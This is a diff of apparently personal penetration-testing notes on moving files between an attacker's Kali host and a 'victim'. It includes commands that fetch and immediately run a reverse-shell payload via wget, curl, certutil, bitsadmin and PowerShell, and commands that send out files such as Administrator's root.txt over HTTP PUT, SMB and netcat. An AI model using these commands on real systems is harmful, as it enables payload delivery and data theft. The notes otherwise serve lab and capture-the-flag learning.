@@ -12,18 +12,17 @@
 
 #### Receiver
 ##### Linux
-`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh`
-(<file> can be just the file name to save to current location, or a full path)
-`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh`
+`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh` <br>
+`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh` <br>
 
 ##### Windows
-`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
-(we need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject.)
-`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
-`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
-(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.)
-`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe`
-(Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files. <br> The C:\Users\Public\ directory is accessible to all users on a Windows system)
+`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe` <br>
+You need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject. <br>
+`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
+`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
+(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.) <br>
+`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe` <br>
+Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files.  <br>
 `powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
 `powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
 instantly execute it:
@@ -33,7 +32,9 @@ instantly execute it:
 
 #### Sender
 
-`curl -T rev_shell.exe http://10.10.10.79:8000`
+`curl -T root.txt http://10.10.10.79:8080`
+
+`curl -X PUT --data-binary@"C:\Users\Administrator\Desktop\root.txt" http://10.10.10.79:8080/root.txt`
 
 #### Receiver
 
@@ -66,25 +67,85 @@ if __name__ == '__main__':
     run()
 ```
 
+Or
+
+`python3 webserver.py
+
+webserver.py
+```
+from flask import Flask, request
+import os
+
+app=Flask(__name__)
+
+@app.route('/root.txt', methods=['PUT'])
+def upload_file():
+    file=request.data
+    with open('root.txt','wb') as f:
+        f.write(file)
+    return "File Uploaded successfully", 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=8080)
+
+```
 
 
+## TFTP
+
+Use metaspoit framework:
+```
+use auxiliary/server/tftp
+set srvhost 192.168.31.141
+set tftproot /root/raj
+run
+```
+
+```
+tftp -i 192.168.31.219 GET ignite.txt
+dir
+```
 
 ## FTP
-Kali -> Victim
 
-| Kali    | Linux Victim | Windows Victim cmd.exe |
-| -------- | ------- |
-| python3 -m http.server 8080  | wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>) | ...|
-| python3 -m pytfplib -w -p <Port_number>
+Use metasploit framework:
+```
+msfconsole -q
+use auxiliary/server/ftp
+set srvhost 192.168.31.141
+set ftproot /root/raj
+set ftpuser raj
+set ftppass 123
+run
+```
+
+```
+ftp 192.168.31.141
+dir
+get ignite.txt
+```
+
+`python3 -m pyftpdlib -w -p 21 -u ignite -P 123`
+
+```
+ftp 192.168.31.141
+get ignite.txt
+put C:\Users\raj\avni.txt
+```
+
+or:
+`wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>)`
 
 ## SMB
 
-#### Sender
-`impacket-smbserver share .`
-`impacket-smbserver share $(pwd) -smb2support`
-( Here we are giving the shared directory name as share, the significance of the share here is that it converts the file’s long path into a single share directory. Here we can give the full path of directory or the pwd as argument so that it takes the current directories path.)
+### Bi-directional
 
-#### Receiver
+```
+impacket-smbclient "$user:$pass@$ip"
+use Shared
+put rev_shell.exe
+get secret.txt
+```
 
 ```
 smbclient -L 192.168.31.141
@@ -94,13 +155,25 @@ get ignite.txt
 put data.txt
 ```
 
-`impacket-smbclient`
+#### Sender
+`impacket-smbserver share .` <br>
+`impacket-smbserver share $(pwd) -smb2support -username smbuser -password smbpass` <br>
+Sometimes it is not allowed to connect to shares without authentication.
+
+#### Receiver
+
+```
+net use \\10.10.10.45\share /user:smbuser
+smbpass
+```
 
 `copy ignite.txt \\192.168.31.141\share\ignite.txt`
 
 to instantly execute it: `powershell -c (\\<kali_IP\<server_name>\<payload)`
 
 or just copy: `copy \\192.168.31.141\share\ignite.txt`
+
+`copy C:\Users\Administrator\Desktop\root.txt \\10.10.10.79\share\`
 
 Kali -> Victim
 
@@ -114,29 +187,29 @@ impacket-smbserver <server_name> .
 
 ### Sender
 
-`scp secrets.txt kali@10.10.10.79:/path/to/dir`
-`scp rev_shell.exe raj@192.168.31.219:/C:/Users/Public`
+`scp secret.txt kali@10.10.10.79:/path/to/dir`
+`scp ./hash.txt kracken@192.168.0.45:"C:\\Users\\kracken\\Desktop\\hacking\\hashes\\hash.txt"`
 
 ### Receiver
 
-
-
-scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir
-
-| Sending    | Receiving |
-| ------- | ------- |
-| scp <file_name> <remote_username>@<remote_IP>:/path/to/dir | scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir |
+`scp kracken@192.168.0.45:"/C:/Users/kracken/Desktop/crack" .`
 
 ## NetCat
 
-| Sending | Receiving |
-| -------- | ------- |
-| nc -w 3 [destination] <Port_number> < <file_name> | nc -l -p <Port_number> > <file_name> |
-| | nc -lvnp <Port_number> |
+receiver:
+`nc -lvp 5555 > file.txt`
+and then sender:
+`nc 192.168.31.141 5555 < file.txt`
+`nc -w 3 [destination] <Port_number> < <file_name>`
+
+On Windows:
+`nc.exe 192.168.31.141 5555 < data.txt`
+`nc -lvp 5555 > data.txt`
 
 
 
 Useful notes:
-- on Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable
-- upgrade your shell, if possible
-- try multiple methods
+- On Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable.
+- On Windows the C:\Users\Public\ directory is accessible to all users on a Windows system.
+- Upgrade your shell if possible.
+- If one method doesn't work, try another one.
